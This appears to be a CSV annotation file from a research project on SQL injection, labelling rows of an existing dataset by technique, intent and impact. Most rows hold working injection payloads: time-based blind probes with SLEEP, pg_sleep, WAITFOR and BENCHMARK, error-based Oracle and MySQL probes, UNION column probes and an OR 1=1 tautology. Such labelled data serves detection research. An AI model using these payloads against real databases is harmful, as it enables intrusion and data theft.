row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
3827,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'","1'+ ( SELECT 'ALIZ' WHERE 5050 = 5050 OR 4411 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) ) +'",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,sysusers,3
6640,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","1%"" OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
11296,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1'|| ( SELECT 'QTEP' WHERE 2572 = 2572 OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
10209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-2718""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""kbvd"" like ""kbvd","-2718"" ) OR 4747 = DBMS_UTILITY.SQLID_TO_SQLHASH ( ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4747 = 4747 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) AND ( ""KBVD"" LIKE ""KBVD",injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
7677,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    as crzr where 5373  =  5373 and elt  (  3114  =  3114,sleep  (  5   )    )   #","1' ) ) AS CRZR WHERE 5373 = 5373 AND ELT ( 3114 = 3114,SLEEP ( 5 ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
6185,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,1 AND 7756 = DBMS_UTILITY.SQLID_TO_SQLHASH ( ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 7756 = 7756 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) # ODVP,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,dual,3
2869,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"waitfor delay '0:0:5' and ""%""  =  ""","WAITFOR DELAY '0:0:5' AND ""%"" = """,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
5084,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '%'  =  ',1%' AND 6969 = ( SELECT 6969 FROM PG_SLEEP ( 5 ) ) AND '%' = ',injection_fragment,UNKNOWN,pg_sleep,6969,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,False,True,False,False,True,False,False,pg_sleep,3
6762,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'+  (  select 'jmdl' where 7827  =  7827,1'+ ( SELECT 'JMDL' WHERE 7827 = 7827,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
5198,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,1 ) ) ) AND 4386 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4386 = 4386 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) AND ( ( ( 8023 = 8023,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
7669,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,-1344 ) AS GQGI WHERE 2545 = 2545 OR 4144 = ( SELECT UPPER ( XMLTYPE ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4144 = 4144 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ||CHR ( 62 ) ) ) FROM DUAL ) --,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,dual,3
25393,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,FROM  ( SELECT DISTINCT most FROM earth ),FROM ( SELECT DISTINCT MOST FROM EARTH ),injection_fragment,UNKNOWN,"earth, ( select distinct most from earth )",most,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,earth,3
9301,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #","1' IN BOOLEAN MODE ) AND UPDATEXML ( 3393,CONCAT ( 0X2E,0X7171706A71, ( SELECT ( ELT ( 3393 = 3393,1 ) ) ) ,0X717A767A71 ) ,1161 ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
5881,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,-7874 ) ) ) OR 2724 IN ( ( CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 112 ) +CHAR ( 106 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 2724 = 2724 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 122 ) +CHAR ( 118 ) +CHAR ( 122 ) +CHAR ( 113 ) ) ) AND ( ( ( 2817 = 2817,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
9852,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#","-8982'+ ( SELECT ANYD WHERE 5358 = 5358 UNION ALL SELECT 5358,5358,5358,5358,5358,5358#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,False,True,False,,3
3076,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671","1 ) ) ) OR 8466 = BENCHMARK ( 5000000,MD5 ( 0X694A4745 ) ) AND ( ( ( 8671 = 8671",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
10987,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","1' ) AS MMHE WHERE 2142 = 2142 OR 8466 = BENCHMARK ( 5000000,MD5 ( 0X694A4745 ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
3329,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq,1 AND 6969 = ( SELECT 6969 FROM PG_SLEEP ( 5 ) ) -- YCZQ,injection_fragment,UNKNOWN,pg_sleep,6969,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,False,False,pg_sleep,3
2303,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1 ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) VWYQ ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
6065,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 6954  =  6954 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","1 ) WHERE 6954 = 6954 AND 3824 = BENCHMARK ( 5000000,MD5 ( 0X76555642 ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
3508,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #","1"" OR ELT ( 5873 = 5873,SLEEP ( 5 ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
675,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,SELECT * FROM USERS WHERE ID = 1 % ( 1 ) OR 1 = 1 -- 1,full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
7092,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'||  (  select 'nwve' where 7721  =  7721,1'|| ( SELECT 'NWVE' WHERE 7721 = 7721,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
5558,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 3535  =  3535 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1 WHERE 3535 = 3535 AND 3580 = ( SELECT COUNT ( * ) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ) --",injection_fragment,UNKNOWN,domains,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,domains,3
4957,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1' ) AND SLEEP ( 5 ) AND ( 'ORXT' = 'ORXT,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
7059,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,1' ) ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SGVO ) AND ( ( ( 'NPZH' = 'NPZH,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,False,True,False,False,True,True,False,,3
